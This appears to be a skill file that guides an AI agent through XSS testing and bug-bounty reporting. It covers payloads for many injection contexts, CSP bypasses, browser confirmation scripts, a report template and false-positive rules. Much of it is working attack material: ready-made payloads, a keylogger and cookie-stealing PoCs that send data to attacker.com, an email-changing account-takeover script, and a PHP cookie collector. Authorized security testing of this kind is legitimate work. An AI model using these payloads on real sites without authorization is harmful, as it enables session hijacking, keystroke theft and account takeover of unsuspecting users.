---
name: xss
description: Elite XSS testing covering all 6 contexts (HTML/attribute/URL/JS/CSS/SVG), stored/reflected/DOM types, CSP bypass, framework-specific sinks, browser execution confirmation, mandatory UI steps, and strict real-impact-only reporting
---

# XSS — Cross-Site Scripting

XSS allows attackers to execute malicious JavaScript in victims' browsers, leading to session hijacking, credential theft, account takeover, and full application compromise. Context determines everything — the same character can be safe in one context and devastating in another.

**CRITICAL RULE: A finding is XSS ONLY if it executes in a browser. HTML reflection without execution is NOT XSS. Always confirm browser execution before reporting.**

**CRITICAL RULE: JSON API RESPONSES ARE NEVER XSS.** If the endpoint returns `Content-Type: application/json`, the payload stored inside that JSON will NEVER execute as JavaScript — browsers parse JSON as data, not HTML. A payload stored in a JSON field and returned in a JSON response is NOT XSS until you prove it is rendered in an HTML context (text/html page) in a real browser.

---

## Real Impact Gate — Answer Before Reporting

Before reporting any XSS finding, explicitly answer ALL of these:

0. **Is the payload rendered in an HTML context (Content-Type: text/html)?**
   - MANDATORY FIRST CHECK: identify the UI page that renders the stored/reflected value
   - If you only have evidence of storage in a JSON API response → NOT confirmed XSS
   - You MUST navigate (with Playwright or browser) to the HTML page that displays the stored value and confirm execution there
   - "The JSON response body contains the payload verbatim" = STORAGE CONFIRMED, XSS NOT CONFIRMED
   - "The profile page at /users/123 rendered the payload and alert() fired" = XSS CONFIRMED

1. **Did the payload EXECUTE in a browser?** (Not just reflect in source — actually execute)
   - Required proof: alert/console.log capture from headless browser, or screenshot of execution, or screenshot of exfiltrated data
   
2. **Is this self-XSS or actual XSS?**
   - Self-XSS: the attacker must be logged into their OWN account to trigger it → NOT reportable (Informational only)
   - Stored XSS: payload stored and executes in OTHER users' browsers → High/Critical
   - Reflected XSS: payload in URL that executes when victim visits the URL → Medium/High
   - DOM XSS via postMessage: payload delivered without URL → High
   
3. **What is the real impact?**
   - Can you demonstrate cookie/token theft? (fetch/XHR to attacker domain)
   - Can you demonstrate account takeover? (change email, change password)
   - Can you chain with CSRF to perform admin actions?
   - Generic "alert(1)" is proof of execution, NOT proof of impact — build a real PoC that exfiltrates session data
   
4. **Is the XSS bypassing a stated defense?**
   - If CSP is present: must bypass it to confirm exploitability
   - If Trusted Types are enforced: must bypass or show a non-covered sink
   - If DOMPurify is used: must use a mutation XSS or uncovered sink

If the payload reflects in HTML but is HTML-encoded → NOT XSS, discard
If the payload triggers in the attacker's own browser only → self-XSS, mark as Informational
If CSP blocks execution of your payload → investigate bypass before reporting

---

## Attack Surface — Where to Look

### Input Types
Every input that can reach user-visible output is an XSS candidate:

**Server-rendered inputs (reflected/stored XSS)**:
- Search queries (`?q=`, `?search=`, `?keyword=`)
- Error messages that include user input
- User profile fields: name, bio, username, location, website URL, company
- Comment/post/message content
- File upload filenames (if displayed in UI)
- HTTP header values if reflected (User-Agent, Referer, X-Forwarded-For)
- Email fields in error messages or confirmation pages
- URL redirects that reflect the destination in a message
- Template-rendered user data (invoice names, notification messages, etc.)

**Client-rendered inputs (DOM XSS)**:
- URL hash/fragment: `window.location.hash`, `location.hash`
- URL search params: `new URLSearchParams(location.search).get('q')`
- document.referrer
- postMessage event data
- localStorage/sessionStorage values read into DOM
- WebSocket messages rendered to DOM
- JSON data from API that gets rendered via innerHTML/dangerouslySetInnerHTML

**File upload XSS vectors**:
- SVG files uploaded and served with `Content-Type: image/svg+xml`
- HTML files uploaded and served with `Content-Type: text/html`
- EXIF metadata in images if parsed and displayed
- Office document properties if extracted and displayed

### Output Contexts
Every context where user input lands requires a different payload:

1. **HTML text node context**: `<div>USER INPUT HERE</div>`
2. **HTML attribute value (quoted)**: `<input value="USER INPUT">`
3. **HTML attribute value (unquoted)**: `<input value=USER INPUT>`
4. **URL attribute**: `<a href="USER INPUT">`, `<img src="USER INPUT">`
5. **JavaScript string**: `<script>var x = "USER INPUT";</script>`
6. **JavaScript variable in script block**: `<script>var x = USER INPUT;</script>`
7. **CSS context**: `<style>body { color: USER INPUT; }</style>`
8. **SVG context**: `<svg><text>USER INPUT</text></svg>`
9. **Event handler**: `<button onclick="USER INPUT">click</button>`

---

## Testing Methodology

### Step 1: Identify All Input Points via UI

Navigate through the entire application using the browser. For every input field found:
1. Take a screenshot of the form/field
2. Submit a canary string: `xss_test_12345_"'><` and observe the response
3. Identify WHICH context the canary lands in (check HTML source)
4. Select the appropriate context-specific payload

**UI Navigation for XSS Testing**:
```
Step 1: Navigate to target application
Step 2: Open browser DevTools → Network tab
Step 3: Fill in each form field with canary: xss_test_12345_"'><
Step 4: Submit the form
Step 5: View page source (Ctrl+U) OR check Network response
Step 6: Search for "xss_test_12345" in the response
Step 7: Observe: how is the canary encoded/reflected?
  - < becomes &lt; → HTML-encoded, likely not XSS
  - " remains " → unencoded quote in attribute → attribute injection possible
  - < remains < → unencoded in HTML text → HTML injection possible
  - < remains < in JavaScript → JS injection possible
Step 8: Select context-appropriate payload based on observation
```

### Step 2: Deploy Context-Aware Payloads

**HTML text context payload**:
```html
<svg onload=alert(document.domain)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

**Attribute value (quoted) payload**:
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
"><script>alert(1)</script>
" onmouseenter=alert(document.cookie)>
```

**JavaScript string context payload**:
```javascript
"-alert(1)-"
\"-alert(1)//
\';alert(1)//
${alert(1)}
```

**URL attribute payload**:
```
javascript:alert(1)
JaVaScRiPt:alert(1)
java&#x09;script:alert(1)
data:text/html,<script>alert(1)</script>
```

**SVG context payload**:
```html
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
```

### Step 3: Confirm Execution in Headless Browser

MANDATORY: Every XSS candidate MUST be confirmed with actual browser execution.

```python
from playwright.sync_api import sync_playwright
import re

def confirm_xss_execution(url_with_payload):
    """Confirm XSS execution in headless browser"""
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        
        # Listen for dialog (alert/confirm/prompt)
        dialog_fired = []
        page.on("dialog", lambda dialog: [
            dialog_fired.append(dialog.message),
            dialog.accept()
        ])
        
        # Listen for console messages
        console_messages = []
        page.on("console", lambda msg: console_messages.append(msg.text))
        
        page.goto(url_with_payload)
        page.wait_for_timeout(3000)
        browser.close()
        
        if dialog_fired:
            print(f"XSS CONFIRMED — Dialog fired: {dialog_fired}")
            return True
        if console_messages:
            print(f"XSS CONFIRMED — Console: {console_messages}")
            return True
        return False
```

### Step 4: Build Impact-Demonstrating PoC

A generic `alert(1)` proves execution but not impact. For reporting, build a real-world attack PoC:

**Session cookie theft PoC (Reflected XSS)**:
```javascript
// Payload (URL-encoded in the actual request):
fetch('https://attacker.com/steal?c='+btoa(document.cookie))
// Or via image beacon:
new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)
```

**Account takeover via XSS PoC**:
```javascript
// Step 1: Fetch CSRF token
fetch('/api/user/settings', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>{
    // Step 2: Change email using extracted CSRF token
    fetch('/api/user/update-email', {
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/json','X-CSRF-Token':d.csrf_token},
      body:JSON.stringify({email:'attacker@evil.com'})
    })
  })
```

**Stored XSS keylogger PoC**:
```javascript
// Injected into stored content field (profile bio, message, comment):
document.addEventListener('keydown',function(e){
  new Image().src='https://attacker.com/keys?k='+e.key+'&url='+location.href
})
```

---

## CSP Bypass Techniques

If Content-Security-Policy is present, do NOT immediately mark as "not exploitable." Attempt bypasses:

```bash
# Check CSP header
curl -sI https://target.com | grep -i content-security-policy

# Analyze the policy
# Dangerous allowances:
# unsafe-inline → scripts can run inline
# unsafe-eval → eval() is allowed
# *.cdn.com → if attacker controls subdomain of CDN
# data: → data: URIs allowed
# blob: → blob: URIs allowed
```

**JSONP bypass** (if allowed origin has JSONP):
```html
<script src="https://allowed-cdn.com/endpoint?callback=alert(1)"></script>
```

**Base tag injection** (retargets relative script URLs):
```html
<base href="https://attacker.com/">
```

**DOM gadget** (find a `eval()` or Function() call in existing scripts):
```javascript
// If page has: eval(location.hash.slice(1))
// Attack URL: https://target.com/page#alert(1)
```

**Script gadget** (existing library functionality abused):
```javascript
// Angular legacy: {{constructor.constructor('alert(1)')()}}
// Handlebars: {{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...
```

---

## Framework-Specific Testing

### React Applications
- Primary sink: `dangerouslySetInnerHTML={{ __html: userInput }}`
- Check for: `ref` callbacks with innerHTML assignment, custom HTML renderers
- Test URL props: `<img src={userInput}>` — can userInput be `javascript:alert(1)`?
- Test event handlers from user input: `<div {...spreadUserInput}>` (if props are spread)

### Vue.js Applications
- Primary sink: `v-html="userInput"` directive
- Test `v-bind` with URL: `<a :href="userInput">` — is javascript: filtered?
- SSR hydration: does the server render unsafe HTML that gets hydrated client-side?

### Angular Applications
- Legacy AngularJS (1.x): template injection via `{{constructor.constructor('alert(1)')()}}`
- Angular 2+: `[innerHTML]="userInput"` — Angular sanitizes by default, but check DomSanitizer.bypassSecurityTrustHtml() calls
- Check templates for: `$sce.trustAsHtml()`, `[attr.src]="userInput"` with javascript: URLs

### Next.js / Nuxt.js
- SSR-rendered components: if data is rendered server-side without escaping → reflected in initial HTML
- `dangerouslySetInnerHTML` in SSR context → same as React but happens server-side

---

## DOM XSS — Special Focus

DOM XSS is harder to find with automated scanners but equally dangerous.

**Source to sink analysis**:
```javascript
// SOURCES (where attacker input enters):
location.href, location.search, location.hash, location.pathname
document.referrer
window.name
localStorage.getItem(), sessionStorage.getItem()
postMessage data
URLSearchParams

// SINKS (where execution can occur):
element.innerHTML = SOURCE  // dangerous
element.outerHTML = SOURCE  // dangerous
document.write(SOURCE)      // dangerous
element.setAttribute('href', SOURCE) // dangerous if 'javascript:'
eval(SOURCE)                // dangerous
setTimeout(SOURCE, 0)       // dangerous
new Function(SOURCE)        // dangerous
```

**DOM XSS Testing Approach**:
```python
# Use browser to navigate with payload in hash/search
browser.goto(f"https://target.com/page#{payload}")
browser.goto(f"https://target.com/page?q={payload}")

# Observe: does the payload appear in the DOM unescaped?
# Observe: does any script element read from location.hash and write to DOM?
```

---

## Stored XSS — Full Testing Protocol

Stored XSS is the highest-priority XSS type because it affects OTHER users without their interaction.

**Testing all storage surfaces**:
```
For each field that stores user data and displays it to others:
1. Log in as User A
2. Fill field with payload: <svg onload=confirm(document.domain)>
3. Save/submit
4. Log in as User B (or use incognito)
5. Navigate to the page that displays User A's stored content
6. Observe: does the payload execute in User B's browser?
```

**High-value stored XSS targets**:
- User profile: name, bio, username, company, location, website
- Messages/chat: message body, attachment names
- Comments/reviews/posts: body content, titles
- File uploads: uploaded filename if displayed in UI
- Error/audit logs if displayed to admins
- Notification content
- Report/document names

---

## UI Steps — Required in Every Report

Every XSS vulnerability report MUST include complete UI reproduction steps:

```
UI REPRODUCTION STEPS FOR STORED XSS:

Step 1: Navigate to https://target.com/profile/edit
Step 2: Log in as any user (create test account if needed)
Step 3: Click on the "Profile" menu item in the top navigation
Step 4: Click "Edit Profile"
Step 5: Locate the "Bio" text field
Step 6: Clear existing content
Step 7: Type the following payload into the Bio field:
        <svg onload=fetch('https://attacker.com/steal?c='+btoa(document.cookie))>
Step 8: Click the "Save Changes" button
Step 9: Take screenshot of the profile page showing the payload is stored
Step 10: Open a NEW browser window (or incognito mode) logged in as User B (or not logged in)
Step 11: Navigate to User A's public profile page: https://target.com/users/[UserA_ID]
Step 12: Observe: the browser executes the payload — the attacker's server receives a request with User B's session cookie in the 'c' parameter
Step 13: Screenshot: attacker.com server log showing received cookie value
Step 14: Verify: using the stolen cookie to authenticate as User B (demonstrates account takeover)
```

---

## Reporting Format — All 11 Sections

**TITLE**: Stored XSS in User Profile Bio Field — Executes in All Visitors' Browsers, Enables Session Hijacking

**SEVERITY**: High / Critical
- Critical if: admin can be targeted (admin visits user profiles) → admin account takeover
- High if: user-to-user targeting (regular user → regular user)
- Medium if: very limited user reach or requires specific navigation

**UI REPRODUCTION STEPS**: (Full numbered steps as shown above)

**SCREENSHOTS**:
- Before: Profile edit page showing Bio field empty
- Step 8: After saving — profile page showing stored content
- Proof: Attacker's server log showing received session cookie from User B
- Impact: User B's profile showing attacker is now logged in as User B

**FULL HTTP REQUEST** (the storage request):
```
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=USER_A_SESSION_TOKEN
Authorization: Bearer USER_A_JWT

{"bio":"<svg onload=fetch('https://attacker.com/steal?c='+btoa(document.cookie))>"}
```

**FULL HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Profile updated"}
```

**EXACT LOCATION**:
- URL: POST https://target.com/api/user/profile
- Vulnerable parameter: `bio` field in JSON body
- UI location: Dashboard → Profile → Edit Profile → Bio text field
- Storage sink: Server stores bio value directly in database without sanitization
- Execution sink: GET https://target.com/users/{id} → bio rendered via innerHTML on line 234 of profile.js

**WORKING POC**:
```html
<!-- Attacker hosts this page or sends crafted link to victim -->
<!-- But more importantly: just visit any profile of User A at https://target.com/users/[ID] -->
<!-- The payload auto-executes when any user views User A's profile page -->

<!-- Attacker's collection server (attacker.com/steal):
<?php
$cookie = $_GET['c'];
file_put_contents('stolen_cookies.txt', base64_decode($cookie) . "\n", FILE_APPEND);
echo 'ok';
?> -->
```

**VALIDATION SECTION**:
- Signal 1: Payload `<svg onload=fetch('https://attacker.com/steal?c='+btoa(document.cookie))>` stored in profile bio — confirmed by reading /api/user/[ID]/profile response which includes the unescaped payload
- Signal 2: Headless browser (Playwright) navigated to User A's profile as User B — confirmed XSS execution via intercepted network request to attacker.com containing User B's base64-encoded session cookie
- Browser execution confirmed: YES — Playwright dialog capture + network request to attacker.com received
- Cross-session confirmed: YES — XSS payload executes in User B's browser context, not attacker's
- Alternative explanations ruled out: Response content-type is text/html, not text/plain. No CSP header present. Cookie has HttpOnly=false (can be read by JS). Payload is rendered unescaped in innerHTML context (confirmed via browser DevTools DOM inspection)

**REAL IMPACT**:
An authenticated attacker can inject persistent JavaScript into their user profile bio field. When any other user — including administrators — views the attacker's profile page, the malicious script executes in their browser and steals their session cookie. The attacker can then use the stolen cookie to authenticate as any user who visited the profile, enabling complete account takeover. Since administrators likely view user profiles for moderation, this also enables privilege escalation to admin. Every user who has visited the attacker's profile since the payload was injected is potentially compromised. With [N] total users on the platform, this represents exposure for up to [N] accounts. This constitutes a critical security breach enabling mass account takeover.

**RECOMMENDED FIX**:
1. Primary: HTML-encode all user-supplied data before rendering in HTML context: use `textContent` instead of `innerHTML`, or use a sanitization library (DOMPurify) with strict settings
2. Secondary: Implement a Content-Security-Policy header that restricts inline script execution: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'`
3. Secondary: Set HttpOnly flag on session cookies to prevent JS access: `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`
4. Verification: after fix, re-test the Bio field with `<svg onload=alert(1)>` and confirm it is either rendered as text or blocked entirely

---

## False Positive Rejection Rules

Mark as FALSE POSITIVE and discard (do NOT report as vulnerability) if ANY of these apply:

**JSON CONTEXT — MOST COMMON FALSE POSITIVE:**
- **The only evidence is a JSON API response containing the payload** → NOT XSS. JSON responses (Content-Type: application/json) are never rendered as HTML by browsers. The payload `<img onerror=alert(1)>` stored in `{"first_name": "<img onerror=alert(1)>"}` will never execute. You MUST find the HTML page that renders this value and confirm execution there.
- The storage endpoint returns JSON and you have NOT navigated to the HTML UI page that renders the stored data → UNCONFIRMED, do not report
- You assumed "navigate to profile page and it will execute" without actually doing it → NOT confirmed, do not report

**ENCODING / ESCAPING:**
- Payload reflects in HTML but all special characters are HTML-encoded (`&lt;`, `&quot;`, etc.) → NOT XSS
- Payload reflects in HTML but JavaScript cannot be triggered from that context → NOT exploitable XSS

**SCOPE / REACH:**
- Self-XSS: payload only executes when the attacker submits it in their own browser, with no path to affect other users → Informational only
- XSS in an admin-only panel where the admin themselves is the only viewer → self-XSS, Informational

**DEFENSES IN PLACE:**
- CSP with strict nonces/hashes and no unsafe-inline or wildcard domains → XSS not exploitable without CSP bypass
- Trusted Types enforced on all sinks → XSS not exploitable without Trusted Types bypass
- Alert fires only in developer-mode console with no real execution path → NOT a valid XSS
